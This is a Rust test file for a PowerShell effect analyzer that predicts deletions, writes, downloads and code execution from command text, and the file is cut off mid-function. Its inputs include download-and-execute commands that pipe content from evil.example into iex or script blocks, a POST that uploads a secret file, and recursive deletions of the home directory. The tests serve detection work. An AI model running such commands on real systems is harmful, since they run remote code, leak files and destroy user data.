use effinterp_engine::Engine;
use effinterp_proto::{
    BoundaryReason, OsDialect, Plan, ResourceExpr, ResourceIdentity, Subject, validate_plan,
};

fn plan(argv: &[&str]) -> Plan {
    let plan = Engine::new()
        .analyze(&Subject::Exec {
            argv: argv.iter().map(|word| word.to_string()).collect(),
            cwd: Some("C:\\work".into()),
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&plan).unwrap();
    plan
}

#[test]
fn literal_removal_preserves_windows_paths_and_command_tail_semantics() {
    for (source, path) in [
        (
            r"Remove-Item -Recurse -LiteralPath C:\Users\test#backup",
            r"C:\Users\test#backup",
        ),
        (
            r"remove-item -literalpath 'D:\old builds\[cache]' -recurse",
            r"D:\old builds\[cache]",
        ),
        (
            r#"Remove-Item -Recurse -LiteralPath "C:\old builds\file""#,
            r"C:\old builds\file",
        ),
        (r"Remove-Item -Rec -LiteralPath C:\old", r"C:\old"),
    ] {
        let p = plan(&["pwsh", "-Command", source]);
        let deletes = p
            .effects
            .iter()
            .filter(|effect| effect.operation.0 == "filesystem.delete")
            .collect::<Vec<_>>();
        assert_eq!(deletes.len(), 1, "{source}");
        assert!(
            matches!(&deletes[0].resource, ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path: actual } } if actual == &effinterp_proto::normalize_path(path, effinterp_proto::PathPlatform::Windows))
        );
        assert_eq!(
            deletes[0].attributes["recursive"],
            effinterp_proto::AttrValue::Bool(true)
        );
        assert_eq!(
            deletes[0].request_assurance,
            effinterp_proto::RequestAssurance::Exact
        );
        assert!(deletes[0].provenance.iter().any(|node| matches!(
            p.provenance[node.0 as usize].kind,
            effinterp_proto::ProvenanceKind::SourceSpan { .. }
        )));
    }
    // A `#` that does not start a token is part of it, so the statement after
    // the one carrying it still runs.
    let hash = plan(&[
        "pwsh",
        "-Command",
        r"Write-Output x#y; Remove-Item -LiteralPath C:\old",
    ]);
    assert!(
        hash.effects
            .iter()
            .any(|effect| effect.operation.0 == "filesystem.delete")
    );
    assert!(hash.boundaries.is_empty(), "{:?}", hash.boundaries);
    let split = plan(&["pwsh", "-command", "Remove-Item", "-LiteralPath", r"C:\old"]);
    assert!(
        split
            .effects
            .iter()
            .any(|effect| effect.operation.0 == "filesystem.delete")
    );
    for argv in [
        vec!["pwsh", "-c", r"Remove-Item -WhatIf -LiteralPath C:\old"],
        vec!["pwsh", "-c", r"Remove-Item -Wh -LiteralPath C:\old"],
        vec![
            "pwsh",
            "-Command",
            r"Remove-Item -LiteralPath C:\old",
            "-WhatIf",
        ],
        // A block comment removes the statement it encloses, however many
        // lines it spans.
        vec![
            "pwsh",
            "-Command",
            "<#\nRemove-Item -LiteralPath C:\\old\n#>",
        ],
        vec!["pwsh", "-Command", r"<# Remove-Item -LiteralPath C:\old #>"],
    ] {
        let p = plan(&argv);
        assert!(
            !p.effects
                .iter()
                .any(|effect| effect.operation.0 == "filesystem.delete"),
            "{argv:?}"
        );
    }
    let ambiguous = plan(&["pwsh", "-Command", r"Remove-Item -Recurse C:\Users\test -w"]);
    assert!(
        !ambiguous
            .effects
            .iter()
            .any(|effect| effect.operation.0 == "filesystem.delete")
    );
    assert!(ambiguous.boundaries.iter().any(|boundary| {
        boundary.reason == effinterp_proto::BoundaryReason::UNRECOGNIZED_ARGUMENTS
            && boundary
                .detail
                .as_deref()
                .is_some_and(|detail| detail.contains("parameter name is ambiguous"))
    }));
    let ambiguous_clear = plan(&[
        "pwsh",
        "-Command",
        r"Clear-Content C:\Users\test\history.txt -w",
    ]);
    assert!(
        !ambiguous_clear
            .effects
            .iter()
            .any(|effect| effect.operation.0 == "filesystem.write")
    );
    // `-Command` takes the whole remaining command line, so the tail becomes
    // part of the command text: `-File` is an unknown Remove-Item parameter,
    // which bounds the binding instead of selecting a script file to read.
    let unsupported_tail = plan(&[
        "pwsh",
        "-Command",
        r"Remove-Item -LiteralPath C:\old",
        "-File",
        "other.ps1",
    ]);
    assert!(
        !unsupported_tail
            .effects
            .iter()
            .any(|effect| effect.operation.0 == "filesystem.read")
    );
    assert!(unsupported_tail.boundaries.iter().any(|boundary| {
        boundary
            .detail
            .as_deref()
            .is_some_and(|detail| detail.contains("parameter name is unknown"))
    }));
    let dynamic_tail = Engine::new()
        .analyze(&Subject::Shell {
            source: r"pwsh -Command 'Remove-Item -LiteralPath C:\old' $extra".into(),
            cwd: Some("/work".into()),
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&dynamic_tail).unwrap();
    assert!(
        !dynamic_tail
            .effects
            .iter()
            .any(|effect| effect.operation.0 == "filesystem.delete")
    );
    assert!(
        dynamic_tail
            .boundaries
            .iter()
            .any(|boundary| boundary.reason == effinterp_proto::BoundaryReason::DYNAMIC_SOURCE)
    );
}

#[test]
fn redirection_writes_the_file_its_operator_names() {
    // The operator ends the word it runs into, so `evil>path` writes the file
    // even though `Write-Output` itself is outside the grammar.
    for (source, path, append) in [
        (
            r"Write-Output evil>C:\logs\out.txt",
            r"C:\logs\out.txt",
            false,
        ),
        (
            r"Remove-Item -LiteralPath C:\old 2> C:\err.txt",
            r"C:\err.txt",
            false,
        ),
        (
            r"Write-Output evil >> C:\logs\out.txt",
            r"C:\logs\out.txt",
            true,
        ),
    ] {
        let p = plan(&["pwsh", "-Command", source]);
        let writes = p
            .effects
            .iter()
            .filter(|effect| effect.operation.0 == "filesystem.write")
            .collect::<Vec<_>>();
        assert_eq!(writes.len(), 1, "{source}");
        assert!(
            matches!(&writes[0].resource, ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path: actual } } if actual == &effinterp_proto::normalize_path(path, effinterp_proto::PathPlatform::Windows)),
            "{source}"
        );
        assert_eq!(
            writes[0].attributes.get("append"),
            append.then_some(&effinterp_proto::AttrValue::Bool(true)),
            "{source}"
        );
    }
    // Merging one stream into another names no file.
    let merged = plan(&["pwsh", "-Command", r"Remove-Item -LiteralPath C:\old 2>&1"]);
    assert!(
        !merged
            .effects
            .iter()
            .any(|effect| effect.operation.0 == "filesystem.write")
    );
    assert!(
        !merged
            .boundaries
            .iter()
            .any(|boundary| boundary.reason
                == effinterp_proto::BoundaryReason::UNRECOGNIZED_ARGUMENTS)
    );
}

/// A Windows environment usually has no `HOME`, so the corpus rows that supply
/// both names cannot tell whether `USERPROFILE` alone still names the home.
#[test]
fn tilde_takes_the_home_directory_the_host_context_names() {
    let tilde = |env: &[(&str, &str)]| {
        let plan = Engine::new()
            .analyze(&Subject::Source {
                language: "powershell".into(),
                dialect: None,
                source: r"Remove-Item -Recurse -Force ~".into(),
                cwd: Some("C:\\work".into()),
                context: effinterp_proto::HostContext {
                    env: env
                        .iter()
                        .map(|(name, value)| (name.to_string(), value.to_string()))
                        .collect(),
                    ..Default::default()
                },
            })
            .unwrap();
        validate_plan(&plan).unwrap();
        plan
    };
    for env in [
        [("USERPROFILE", r"C:\Users\test")].as_slice(),
        [("HOME", r"C:\Users\test")].as_slice(),
        [
            ("HOME", r"C:\Users\test"),
            ("USERPROFILE", r"C:\Users\other"),
        ]
        .as_slice(),
    ] {
        let plan = tilde(env);
        let deletes = plan
            .effects
            .iter()
            .filter(|effect| effect.operation.0 == "filesystem.delete")
            .collect::<Vec<_>>();
        assert_eq!(deletes.len(), 1, "{env:?}");
        assert!(
            matches!(&deletes[0].resource, ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } } if path == "C:/Users/test"),
            "{env:?}"
        );
        let environment_reads = plan
            .effects
            .iter()
            .filter_map(|effect| match (&effect.operation.0[..], &effect.resource) {
                (
                    "environment.read",
                    ResourceExpr::Concrete {
                        identity: ResourceIdentity::EnvironmentVariable { name },
                    },
                ) => Some(name.as_str()),
                _ => None,
            })
            .collect::<Vec<_>>();
        assert_eq!(environment_reads, ["HOME", "USERPROFILE"], "{env:?}");
    }
    // Neither name in the context leaves the analyzer with no home to expand;
    // it never reaches for its own.
    let unknown = tilde(&[]);
    assert_eq!(
        unknown
            .effects
            .iter()
            .filter(|effect| effect.operation.0 == "environment.read")
            .count(),
        2
    );
    assert!(
        !unknown
            .effects
            .iter()
            .any(|effect| effect.operation.0 == "filesystem.delete")
    );
    assert_eq!(unknown.boundaries.len(), 1);
}

#[test]
fn literal_home_commands_preserve_their_filesystem_mutation() {
    let analyze = |source: &str, home: Option<&str>| {
        let plan = Engine::new()
            .analyze(&Subject::Source {
                language: "powershell".into(),
                dialect: None,
                source: source.into(),
                cwd: Some("/work".into()),
                context: effinterp_proto::HostContext {
                    env: home
                        .map(|home| [("HOME".into(), home.into())].into())
                        .unwrap_or_default(),
                    ..Default::default()
                },
            })
            .unwrap();
        validate_plan(&plan).unwrap();
        plan
    };
    for (source, operation) in [
        (
            r#"Remove-Item "$HOME/.nah/trust.json""#,
            "filesystem.delete",
        ),
        (r#"rm $HOME/.nah/trust.json"#, "filesystem.delete"),
        (
            r#"Clear-Content "$HOME/.nah/trust.json""#,
            "filesystem.write",
        ),
    ] {
        let plan = analyze(source, Some("/home/test"));
        assert!(plan.effects.iter().any(|effect| {
            effect.operation.as_str() == operation
                && matches!(&effect.resource, ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } } if path == "/home/test/.nah/trust.json")
        }), "{source}: {:?}", plan.boundaries);
        assert!(plan.effects.iter().any(|effect| {
            effect.operation.as_str() == "environment.read"
                && matches!(&effect.resource, ResourceExpr::Concrete { identity: ResourceIdentity::EnvironmentVariable { name } } if name == "HOME")
        }));
    }
    let missing = analyze(r#"Remove-Item "$HOME/.nah/trust.json""#, None);
    assert!(
        missing
            .effects
            .iter()
            .all(|effect| effect.operation.as_str() != "filesystem.delete")
    );
    assert!(
        missing
            .boundaries
            .iter()
            .any(|boundary| boundary.detail.as_deref()
                == Some("PowerShell HOME is not supplied by the host environment"))
    );
}

#[test]
fn unsupported_removal_source_has_one_boundary_and_no_invented_delete() {
    for source in [
        "Remove-Item -LiteralPath $target",
        r"Remove-Item -LiteralPath (Get-Location)",
        r"Remove-Item -LiteralPath HKLM:\Software",
        r"Remove-Item -LiteralPath #comment",
        r"Remove-Item -Unknown C:\old",
        r"Remove-Item -LiteralPath C:\old 2>&3",
        r#"Remove-Item -LiteralPath "C:\$target""#,
        r"'Remove-Item' -LiteralPath C:\old",
        "Remove-Item -LiteralPath C:\\old\u{201c}name\u{201d}",
    ] {
        let p = Engine::new()
            .analyze(&Subject::Source {
                language: "powershell".into(),
                dialect: None,
                source: source.into(),
                cwd: Some("C:\\work".into()),
                context: Default::default(),
            })
            .unwrap();
        validate_plan(&p).unwrap();
        assert!(p.effects.is_empty(), "{source}");
        assert_eq!(p.boundaries.len(), 1, "{source}");
        assert!(
            p.boundaries[0]
                .detail
                .as_ref()
                .unwrap()
                .contains("PowerShell")
        );
    }
    // A statement the grammar does not model, or an operand it cannot bind,
    // bounds itself without hiding the deletion the same source states.
    for source in [
        r"Remove-Item -LiteralPath C:\old; Get-ChildItem C:\other",
        r"Remove-Item -LiteralPath C:\old C:\other",
    ] {
        let p = Engine::new()
            .analyze(&Subject::Source {
                language: "powershell".into(),
                dialect: None,
                source: source.into(),
                cwd: Some("C:\\work".into()),
                context: Default::default(),
            })
            .unwrap();
        validate_plan(&p).unwrap();
        assert!(
            p.effects
                .iter()
                .any(|effect| effect.operation.0 == "filesystem.delete"),
            "{source}"
        );
        assert_eq!(p.boundaries.len(), 1, "{source}");
    }

    let mut limits = effinterp_engine::AnalysisLimits::default().to_map();
    limits.insert("max_source_bytes".into(), 8);
    let limited = Engine::with_limits(limits)
        .unwrap()
        .analyze(&Subject::Source {
            language: "powershell".into(),
            dialect: None,
            source: r"Remove-Item -LiteralPath C:\old".into(),
            cwd: Some("C:\\work".into()),
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&limited).unwrap();
    assert!(limited.effects.is_empty());
    assert_eq!(limited.boundaries.len(), 1);
    assert_eq!(
        limited.boundaries[0].limit.as_deref(),
        Some("max_source_bytes")
    );
}

/// PowerShell resolves a command name as an alias, then a cmdlet, and only
/// then a program on its path. Reading a cmdlet with a program's option
/// grammar, or dropping a program because the cmdlet grammar does not know
/// it, would both name the wrong resources.
#[test]
fn command_resolution_separates_cmdlets_from_native_programs() {
    // A native command reaches the model of the program it names; PATHEXT
    // makes the executable extension name the same program.
    for source in [
        r"curl.exe -o C:\payload https://example.test/x",
        r"git status",
    ] {
        let p = plan(&["pwsh", "-Command", source]);
        assert!(p.boundaries.is_empty(), "{source}: {:?}", p.boundaries);
        assert!(
            p.effects.len() > 2,
            "{source}: {:?}",
            p.effects
                .iter()
                .map(|effect| &effect.operation.0)
                .collect::<Vec<_>>()
        );
    }
    let download = plan(&[
        "pwsh",
        "-Command",
        r"curl.exe -o C:\payload https://example.test/x",
    ]);
    assert!(download.effects.iter().any(|effect| matches!(
        &effect.resource,
        ResourceExpr::Concrete {
            identity: ResourceIdentity::FsPath { path }
        } if path == "C:/payload"
    )));
    // `curl` without the extension is the Windows PowerShell alias of
    // Invoke-WebRequest, so it never becomes the native downloader of the
    // same name.
    let alias = plan(&[
        "pwsh",
        "-Command",
        r"curl https://example.test/x -OutFile C:\safe",
    ]);
    assert!(alias.boundaries.is_empty(), "{:?}", alias.boundaries);
    assert!(alias.provenance.iter().any(|node| matches!(
        &node.kind,
        effinterp_proto::ProvenanceKind::ModelApplication { model }
            if model == "powershell/invoke-webrequest@v1"
    )));
    assert!(!alias.effects.iter().any(|effect| matches!(
        &effect.resource,
        ResourceExpr::Concrete {
            identity: ResourceIdentity::Process { executable, .. }
        } if executable == "curl"
    )));
    // An unmodeled cmdlet keeps its boundary rather than being launched as a
    // program of that name.
    let cmdlet = plan(&["pwsh", "-Command", r"Get-ChildItem C:\a"]);
    assert!(!cmdlet.effects.iter().any(|effect| matches!(
        &effect.resource,
        ResourceExpr::Concrete {
            identity: ResourceIdentity::Process { executable, .. }
        } if executable == "Get-ChildItem"
    )));
    assert_eq!(cmdlet.boundaries.len(), 1);
}

fn source_plan(source: &str, env: &[(&str, &str)]) -> Plan {
    let plan = Engine::new()
        .analyze(&Subject::Source {
            language: "powershell".into(),
            dialect: None,
            source: source.into(),
            cwd: Some("C:\\work".into()),
            context: effinterp_proto::HostContext {
                env: env
                    .iter()
                    .map(|(name, value)| (name.to_string(), value.to_string()))
                    .collect(),
                ..Default::default()
            },
        })
        .unwrap();
    validate_plan(&plan).unwrap();
    plan
}

/// The paths of the plan's effects of one operation, in emission order.
fn paths<'a>(plan: &'a Plan, operation: &str) -> Vec<&'a str> {
    plan.effects
        .iter()
        .filter(|effect| effect.operation.0 == operation)
        .filter_map(|effect| match &effect.resource {
            ResourceExpr::Concrete {
                identity: ResourceIdentity::FsPath { path },
            } => Some(path.as_str()),
            _ => None,
        })
        .collect()
}

fn has_model(plan: &Plan, name: &str) -> bool {
    plan.provenance.iter().any(|node| {
        matches!(&node.kind, effinterp_proto::ProvenanceKind::ModelApplication { model } if model == name)
    })
}

/// `$HOME` is PowerShell's automatic variable, which a Windows host fills
/// from USERPROFILE, and `$env:NAME` reads the environment variable.
#[test]
fn home_variable_and_environment_provider_name_the_windows_home() {
    for source in [
        r"Remove-Item -Recurse $HOME",
        r"Remove-Item -Recurse ${HOME}",
        r"Remove-Item -Recurse $env:USERPROFILE",
        r#"Remove-Item -Recurse "$env:USERPROFILE""#,
    ] {
        let plan = source_plan(source, &[("USERPROFILE", r"C:\Users\test")]);
        assert_eq!(
            paths(&plan, "filesystem.delete"),
            ["C:/Users/test"],
            "{source}"
        );
        assert!(
            plan.boundaries.is_empty(),
            "{source}: {:?}",
            plan.boundaries
        );
    }
    // An environment variable the host does not set expands to nothing
    // PowerShell would delete, so it bounds the statement instead.
    let unset = source_plan(
        r"Remove-Item -Recurse $env:HOME",
        &[("USERPROFILE", r"C:\Users\test")],
    );
    assert!(paths(&unset, "filesystem.delete").is_empty());
    assert_eq!(unset.boundaries.len(), 1);
}

#[test]
fn attached_switch_values_bind_their_switch() {
    let deletes = |source: &str| {
        paths(&source_plan(source, &[]), "filesystem.delete")
            .into_iter()
            .map(str::to_string)
            .collect::<Vec<_>>()
    };
    assert_eq!(
        deletes(r"Remove-Item -Recurse -Force -Confirm:$false C:\old"),
        ["C:/old"]
    );
    assert_eq!(deletes(r"Remove-Item C:\old -WhatIf:$false"), ["C:/old"]);
    assert!(deletes(r"Remove-Item C:\old -WhatIf:$true").is_empty());
    let not_recursive = source_plan(r"Remove-Item -Recurse:$false C:\old", &[]);
    assert_eq!(
        not_recursive.effects[0].attributes["recursive"],
        effinterp_proto::AttrValue::Bool(false)
    );
    let recursive = source_plan(r"Remove-Item C:\old -Recurse:$true", &[]);
    assert_eq!(
        recursive.effects[0].attributes["recursive"],
        effinterp_proto::AttrValue::Bool(true)
    );
    // A switch value that is not a literal boolean fails the binding, so
    // the cmdlet does not run. A quoted '$true' or '$false' is a string.
    for source in [
        r"Remove-Item C:\old -WhatIf:yes",
        r"Remove-Item C:\old -Recurse:'$true'",
        r"Remove-Item -Recurse C:\old -WhatIf:'$false'",
    ] {
        let invalid = source_plan(source, &[]);
        assert!(paths(&invalid, "filesystem.delete").is_empty(), "{source}");
        assert_eq!(invalid.boundaries.len(), 1, "{source}");
    }
}

#[test]
fn pipeline_elements_are_commands_of_their_own() {
    let piped = source_plan(
        r"Write-Output x | Remove-Item -Recurse -LiteralPath C:\old",
        &[],
    );
    assert_eq!(paths(&piped, "filesystem.delete"), ["C:/old"]);
    assert!(piped.boundaries.is_empty(), "{:?}", piped.boundaries);
    // `||` runs the next pipeline only when the first fails, which is not
    // modeled.
    let chained = source_plan(r"Write-Output x || Remove-Item -LiteralPath C:\old", &[]);
    assert!(paths(&chained, "filesystem.delete").is_empty());
    assert_eq!(chained.boundaries.len(), 1);
}

#[test]
fn escaped_separator_stays_inside_its_statement() {
    for source in [
        r"Write-Output a`; Remove-Item -Recurse C:\old",
        r"Write-Output a`| Remove-Item -Recurse C:\old",
    ] {
        let plan = source_plan(source, &[]);
        assert!(paths(&plan, "filesystem.delete").is_empty(), "{source}");
        assert_eq!(plan.boundaries.len(), 1, "{source}");
    }
}

#[test]
fn call_operator_runs_the_command_its_operand_names() {
    let nested = plan(&["pwsh", "-Command", r"& cmd /c rd /s /q C:\old"]);
    assert_eq!(paths(&nested, "filesystem.delete"), ["C:/old"]);
    let quoted = plan(&["pwsh", "-Command", "& 'git' status"]);
    assert!(quoted.boundaries.is_empty(), "{:?}", quoted.boundaries);
    // Without the operator a quoted name is an expression, not a command.
    let expression = plan(&["pwsh", "-Command", "'git' status"]);
    assert_eq!(expression.boundaries.len(), 1);
}

#[test]
fn comma_collection_binds_every_path_partially() {
    let plan = source_plan(r"Remove-Item -Recurse -LiteralPath 'C:\a','C:\b'", &[]);
    assert_eq!(paths(&plan, "filesystem.delete"), ["C:/a", "C:/b"]);
    assert_eq!(plan.boundaries.len(), 1);
    // A program receives each element as an argument of its own, which the
    // native argv does not model.
    let program = source_plan("git add a,b", &[]);
    assert_eq!(program.boundaries.len(), 1);
}

#[test]
fn content_cmdlets_access_the_path_they_bind() {
    for (source, operation, append, model) in [
        (
            r"Set-Content -Path C:\f -Value x",
            "filesystem.write",
            false,
            "powershell/set-content@v1",
        ),
        (
            r"Add-Content C:\f x",
            "filesystem.write",
            true,
            "powershell/add-content@v1",
        ),
        (
            r"Write-Output x | Out-File C:\f",
            "filesystem.write",
            false,
            "powershell/out-file@v1",
        ),
        (
            r"Out-File -FilePath C:\f -Append",
            "filesystem.write",
            true,
            "powershell/out-file@v1",
        ),
        (
            r"Get-Content C:\f",
            "filesystem.read",
            false,
            "powershell/get-content@v1",
        ),
        (
            r"gc -LiteralPath C:\f -Raw",
            "filesystem.read",
            false,
            "powershell/get-content@v1",
        ),
    ] {
        let plan = source_plan(source, &[]);
        assert_eq!(paths(&plan, operation), ["C:/f"], "{source}");
        assert!(
            plan.boundaries.is_empty(),
            "{source}: {:?}",
            plan.boundaries
        );
        assert!(has_model(&plan, model), "{source}");
        let effect = plan
            .effects
            .iter()
            .find(|effect| effect.operation.0 == operation)
            .unwrap();
        assert_eq!(
            effect.attributes.get("append"),
            append.then_some(&effinterp_proto::AttrValue::Bool(true)),
            "{source}"
        );
    }
    let what_if = source_plan(r"Set-Content C:\f x -WhatIf", &[]);
    assert!(paths(&what_if, "filesystem.write").is_empty());
}

/// Boundaries saying a host observation, here a listing, was unavailable.
fn unestablished(plan: &Plan) -> usize {
    plan.boundaries
        .iter()
        .filter(|boundary| boundary.reason == BoundaryReason::OBSERVATION_UNAVAILABLE)
        .count()
}

#[test]
fn move_and_rename_remove_the_source_entry() {
    let moved = source_plan(r"Move-Item C:\a C:\b", &[]);
    assert_eq!(paths(&moved, "filesystem.move"), ["C:/a"]);
    assert_eq!(paths(&moved, "filesystem.delete"), ["C:/a"]);
    // An existing directory destination receives the entry under its name.
    assert_eq!(paths(&moved, "filesystem.write"), ["C:/b", "C:/b/a"]);
    // A moved directory brings what it holds, which no host listed here.
    assert_eq!(unestablished(&moved), 1, "{:?}", moved.boundaries);
    assert_eq!(moved.boundaries.len(), 1, "{:?}", moved.boundaries);
    let renamed = source_plan(r"Rename-Item C:\dir\a b", &[]);
    assert_eq!(paths(&renamed, "filesystem.delete"), ["C:/dir/a"]);
    assert_eq!(paths(&renamed, "filesystem.write"), ["C:/dir/b"]);
    // A new name that is a path names no entry of the source's directory.
    let elsewhere = source_plan(r"Rename-Item C:\dir\a D:\b", &[]);
    assert_eq!(paths(&elsewhere, "filesystem.delete"), ["C:/dir/a"]);
    assert!(paths(&elsewhere, "filesystem.write").is_empty());
    assert_eq!(elsewhere.boundaries.len(), 1);
    // Copy-Item leaves the source in place; its aliases name the same cmdlet.
    for source in [r"Copy-Item C:\a C:\b", r"cpi C:\a C:\b", r"copy C:\a C:\b"] {
        let copied = source_plan(source, &[]);
        assert_eq!(paths(&copied, "filesystem.read"), ["C:/a"], "{source}");
        assert_eq!(
            paths(&copied, "filesystem.write"),
            ["C:/b", "C:/b/a"],
            "{source}"
        );
        assert!(paths(&copied, "filesystem.delete").is_empty(), "{source}");
        assert!(
            copied.boundaries.is_empty(),
            "{source}: {:?}",
            copied.boundaries
        );
    }
    let aliased = source_plan(r"mi C:\a C:\b", &[]);
    assert_eq!(paths(&aliased, "filesystem.delete"), ["C:/a"]);
    // Every bound source is copied, and an unresolved one (no home for `~`)
    // still leaves the destination established.
    let several = source_plan(r"Copy-Item -Path C:\a,~\rel -Destination C:\d\", &[]);
    assert_eq!(paths(&several, "filesystem.read"), ["C:/a"]);
    assert_eq!(
        paths(&several, "filesystem.write"),
        ["C:/d", "C:/d/a", "C:/d/rel"]
    );
    assert_eq!(several.boundaries.len(), 1);
    // Where no host lists what a wildcard selects, its destination stays
    // written and an observation boundary says what lands is unknown. There
    // is no pattern write.
    let recursive = source_plan(r"Copy-Item -Recurse C:\src\* C:\Windows", &[]);
    assert_eq!(paths(&recursive, "filesystem.write"), ["C:/Windows"]);
    assert_eq!(
        (unestablished(&recursive), recursive.boundaries.len()),
        (1, 1),
        "{:?}",
        recursive.boundaries
    );
    // Filters apply to a named item itself: one they exclude is not copied,
    // and one they admit is.
    let excluded = source_plan(r"Copy-Item -Recurse C:\src C:\d -Exclude s*", &[]);
    assert!(paths(&excluded, "filesystem.read").is_empty());
    assert!(paths(&excluded, "filesystem.write").is_empty());
    assert!(excluded.boundaries.is_empty(), "{:?}", excluded.boundaries);
    let admitted = source_plan(r"Copy-Item -Recurse C:\src C:\d -Exclude x", &[]);
    assert_eq!(paths(&admitted, "filesystem.read"), ["C:/src"]);
    assert_eq!(paths(&admitted, "filesystem.write"), ["C:/d", "C:/d/src"]);
    assert_eq!(unestablished(&admitted), 1, "{:?}", admitted.boundaries);
    // -Container:$false flattens, which is not modeled: its own boundary says
    // so, and no listing is read for a hierarchy it does not keep.
    let flat = source_plan(r"Copy-Item -Recurse C:\src C:\d -Container:$false", &[]);
    assert_eq!(unestablished(&flat), 0, "{:?}", flat.boundaries);
    assert_eq!(flat.boundaries.len(), 1);
    // Another provider's items are not files.
    let registry = source_plan(r"Copy-Item HKLM:\Software\x C:\y", &[]);
    assert!(paths(&registry, "filesystem.write").is_empty());
    assert_eq!(registry.boundaries.len(), 1);
    // Each source is its own item: another provider's source does not stop
    // a filesystem source from landing, and FileSystem:: names the filesystem.
    let mixed = source_plan(r"Copy-Item -Path C:\a,Env:PATH -Destination C:\d", &[]);
    assert_eq!(paths(&mixed, "filesystem.read"), ["C:/a"]);
    assert_eq!(paths(&mixed, "filesystem.write"), ["C:/d", "C:/d/a"]);
    let qualified = source_plan(r"Copy-Item -LiteralPath FileSystem::C:\a C:\b", &[]);
    assert_eq!(paths(&qualified, "filesystem.read"), ["C:/a"]);
    assert!(
        qualified.boundaries.is_empty(),
        "{:?}",
        qualified.boundaries
    );
}

#[test]
fn hard_link_reads_its_target_and_creates_the_link() {
    let plan = source_plan(
        r"New-Item -ItemType HardLink -Path C:\link -Target C:\target",
        &[],
    );
    assert_eq!(paths(&plan, "filesystem.read"), ["C:/target"]);
    assert_eq!(paths(&plan, "filesystem.create"), ["C:/link"]);
    assert!(plan.boundaries.is_empty(), "{:?}", plan.boundaries);
    let other = source_plan(r"New-Item -ItemType File -Path C:\x", &[]);
    assert!(paths(&other, "filesystem.create").is_empty());
    assert_eq!(other.boundaries.len(), 1);
}

#[test]
fn downloaded_content_reaching_invoke_expression_runs_as_code() {
    use effinterp_proto::{CausalReason, OccurrenceKind};
    let run = |source: &str| {
        let plan = Engine::new()
            .with_causality_detail(true)
            .analyze(&Subject::Source {
                language: "powershell".into(),
                dialect: None,
                source: source.into(),
                cwd: Some("C:\\work".into()),
                context: Default::default(),
            })
            .unwrap();
        validate_plan(&plan).unwrap();
        plan
    };
    let transfers_to_code = |plan: &Plan| {
        let graph = plan.causality.graph.as_ref().expect("causality detail");
        let operation = |id: &effinterp_proto::OccurrenceId| {
            graph
                .nodes
                .iter()
                .find(|node| &node.id == id)
                .and_then(|node| match &node.occurrence {
                    OccurrenceKind::ResourceInteraction { operation, .. } => {
                        Some(operation.0.as_str())
                    }
                    _ => None,
                })
        };
        graph.edges.iter().any(|edge| {
            edge.reason == CausalReason::ResourceTransfer
                && operation(&edge.from) == Some("network.download")
                && operation(&edge.to) == Some("process.code_execution")
        })
    };
    for source in [
        "iwr https://evil.example/x | iex",
        "irm -useb https://evil.example/x | Invoke-Expression",
        "(Invoke-WebRequest https://evil.example/x).Content | iex",
        "iex (New-Object Net.WebClient).DownloadString('https://evil.example/x')",
        "Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://evil.example/x'))",
        "Invoke-Expression (Invoke-WebRequest -Uri https://evil.example/x).Content",
        "iex $(irm https://evil.example/x)",
        // A built-in alias outranks a function of the same name.
        "function iex { }; irm https://evil.example/x | iex",
        "function iwr { }; iwr https://evil.example/x | iex",
        // A script block compiled from the download and then run.
        "& ([scriptblock]::Create((irm https://evil.example/x))) -Force",
        ". ([System.Management.Automation.ScriptBlock]::Create((New-Object Net.WebClient).DownloadString('https://evil.example/x')))",
        "[scriptblock]::Create((iwr https://evil.example/x).Content).Invoke()",
        // A block held in a variable, run by Invoke-Command or a method.
        "$sb = [scriptblock]::Create((irm https://evil.example/x)); $sb.InvokeReturnAsIs()",
        "$sb = [scriptblock]::Create((irm https://evil.example/x)); icm $sb -ArgumentList 1",
    ] {
        let plan = run(source);
        assert!(plan.effects.iter().any(|effect| {
            effect.operation.0 == "network.download"
                && matches!(&effect.resource, ResourceExpr::Concrete { identity: ResourceIdentity::NetworkEndpoint { host, .. } } if host == "evil.example")
        }), "{source}");
        assert!(transfers_to_code(&plan), "{source}");
        // The downloaded code itself stays unknown.
        assert!(
            plan.boundaries
                .iter()
                .any(|boundary| boundary.reason.as_str() == "unmodeled_dynamic_code"),
            "{source}"
        );
    }
    // Output that is stored, printed, or run by a command whose alias or
    // cmdlet was redefined, and a request that sends a body, run no
    // downloaded code.
    for source in [
        r"iwr https://example.test/x -OutFile C:\f",
        "irm https://example.test/x | Write-Output",
        "function Invoke-Expression { }; irm https://evil.example/x | iex",
        "function Invoke-Expression { }; iex (irm https://evil.example/x)",
        "Set-Alias iex Write-Output; irm https://evil.example/x | iex",
        "function Invoke-RestMethod { }; irm https://evil.example/x | iex",
        r"irm https://evil.example/x -Method Post -InFile C:\secret | iex",
        // Compiling a script block does not run it.
        "[scriptblock]::Create((irm https://evil.example/x))",
        "$sb = [scriptblock]::Create((irm https://evil.example/x)); $sb.ToString()",
        // A reassigned variable no longer holds the download.
        "$sb = [scriptblock]::Create((irm https://evil.example/x)); $sb = [scriptblock]::Create('Get-Date'); & $sb",
        // Invoke-Command on another computer does not run it here.
        "Invoke-Command -ComputerName srv -ScriptBlock ([scriptblock]::Create((irm https://evil.example/x)))",
        "Invoke-Command -ScriptBlock ([scriptblock]::Create((irm https://evil.example/x))) -ArgumentList 1 -ComputerName srv",
    ] {
        let plan = run(source);
        assert!(
            plan.effects
                .iter()
                .all(|effect| effect.operation.0 != "process.code_execution"),
            "{source}"
        );
    }
    // Nesting past the semantic unwrap limit, but below the stack-nesting
    // guard, ends in the value-depth boundary. (Nesting past the stack guard is
    // covered by robustness::powershell_deep_groups.)
    let deep = run(&format!(
        "iex {}irm https://evil.example/x{}",
        "(".repeat(100),
        ")".repeat(100)
    ));
    assert!(
        deep.boundaries
            .iter()
            .any(|boundary| boundary.limit.as_deref() == Some("max_value_depth"))
    );
    assert!(
        deep.effects
            .iter()
            .all(|effect| effect.operation.0 != "process.code_execution")
    );
}

/// Whether the causality graph carries content from a file read to an upload.
fn read_reaches_upload(plan: &Plan) -> bool {
    use effinterp_proto::OccurrenceKind;
    let graph = plan.causality.graph.as_ref().unwrap();
